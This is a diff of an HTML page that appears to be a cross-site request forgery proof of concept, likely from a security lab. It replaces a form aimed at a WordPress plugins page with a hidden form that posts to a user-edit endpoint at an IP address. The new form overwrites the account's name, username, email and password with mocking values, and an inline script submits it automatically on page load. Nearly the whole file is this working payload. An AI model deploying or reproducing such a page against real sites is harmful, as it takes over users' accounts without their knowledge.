@@ -1,11 +1,19 @@
 <!DOCTYPE html>
 <html>
    <body>
-      <form action="http://wpdistillery.vm/wp-admin/plugins.php" method="POST">
-         <input type="hidden" name="hostname" value="newAdmin" />
-         <input type="hidden" name="connection_type" value="ftp" />
-         <input type="hidden" name="password" value="password" />
-         <input type="submit" value="Submit request" />
-      </form>
+     <form action="https://35.184.88.145/red/public/staff/users/edit.php?id=3" method="post"
+id="csrf_form"> 
+<input name="csrf_token" value="asufhwfoeufhoaefhwo47374fgsdghdh" type="hidden">
+<input type="text" name="first_name" value="BYEBYE" type="hidden" />
+	 	<input type="text" name="last_name" value="Haxing"  type="hidden"/>
+	 	<input type="text" name="username" value="NotSecured" type="hidden">
+	 	<input type="text" name="email" value="yougothackd" type="hidden">
+        <input type="password" name="previous_password" value="no"  type="hidden"> 
+	 	<input type="password" name="password" value="no"  type="hidden">
+	 	<input type="password" name="confirm_password" value="no"  type="hidden">
+	 	<input type="submit"/>
+</form>
+
+<script>document.getElementById("csrf_form").submit();</script>
    </body>
 </html>
